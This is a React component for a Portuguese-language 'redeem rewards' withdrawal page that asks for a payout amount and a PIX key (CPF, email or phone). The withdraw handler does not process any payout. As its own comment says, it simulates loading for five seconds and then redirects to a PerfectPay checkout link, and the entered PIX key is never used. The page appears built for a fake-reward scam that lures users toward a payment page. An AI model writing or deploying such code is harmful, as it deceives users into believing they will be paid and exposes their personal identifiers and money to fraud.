import { useState } from 'react';
import { ArrowLeft, HelpCircle } from 'lucide-react';
import { ProcessingWithdraw } from './ProcessingWithdraw';

interface WithdrawPageProps {
  balance: number;
  onBack: () => void;
}

export function WithdrawPage({ balance, onBack }: WithdrawPageProps) {
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [pixKey, setPixKey] = useState('');
  const [pixKeyType, setPixKeyType] = useState('');

  const handleWithdraw = () => {
    if (!selectedAmount || !pixKey || !pixKeyType) {
      alert('Por favor, preencha todos os campos antes de realizar o saque.');
      return;
    }

    setIsProcessing(true);

    // Simula carregamento e redireciona
    setTimeout(() => {
      window.location.href = 'https://go.perfectpay.com.br/PPU38CPDP3L';
    }, 5000);
  };

  if (isProcessing) {
    return <ProcessingWithdraw />;
  }

  return (
    <div className="min-h-screen bg-white">
      <div className="p-4 border-b flex items-center justify-between">
        <button onClick={onBack} className="text-gray-600">
          <ArrowLeft size={24} />
        </button>
        <h1 className="text-lg font-medium">Resgatar recompensas</h1>
        <button className="text-gray-600">
          <HelpCircle size={24} />
        </button>
      </div>

      <div className="p-6 flex flex-col items-center">
        <div className="w-16 h-16 bg-yellow-400 rounded-full mb-6 flex items-center justify-center">
          <span className="text-2xl">₽</span>
        </div>

        <div className="w-full bg-black text-white p-4 rounded-lg mb-8">
          <p className="text-center text-sm">Últimas recompensas: R${balance.toFixed(2)}</p>
        </div>

        <div className="w-full">
          <h2 className="text-xl font-medium mb-4">Sacar dinheiro</h2>
          
          <div className="mb-6">
            <div className="flex items-center justify-center gap-2 mb-4">
              <img src="/pix.svg" alt="PIX" className="h-6" />
              <span className="text-gray-600">Transferência bancária / PIX</span>
            </div>

            {/* Botões interativos para selecionar valores */}
            <div className="flex gap-2 mb-4">
              {[1.5, 5, 10, balance].map((amount) => (
                <button
                  key={amount}
                  onClick={() => setSelectedAmount(amount)}
                  className={`flex-1 py-2 px-3 rounded ${
                    selectedAmount === amount ? 'bg-[#FF3B5C] text-white' : 'bg-gray-100 hover:bg-gray-200'
                  } transition-colors`}
                >
                  R${amount.toFixed(2)}
                </button>
              ))}
            </div>

            <select
              value={pixKeyType}
              onChange={(e) => setPixKeyType(e.target.value)}
              className="w-full p-3 border rounded-lg mb-3"
            >
              <option value="">Selecione o tipo de chave</option>
              <option value="cpf">CPF</option>
              <option value="email">Email</option>
              <option value="telefone">Telefone</option>
            </select>

            <input
              type="text"
              value={pixKey}
              onChange={(e) => setPixKey(e.target.value)}
              placeholder="Digite a sua chave PIX"
              className="w-full p-3 border rounded-lg mb-4"
            />

            <button 
              onClick={handleWithdraw}
              className="w-full bg-[#FF3B5C] text-white py-3 rounded-lg font-medium hover:bg-[#ff2c4f] transition-colors"
            >
              Realizar Saque
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
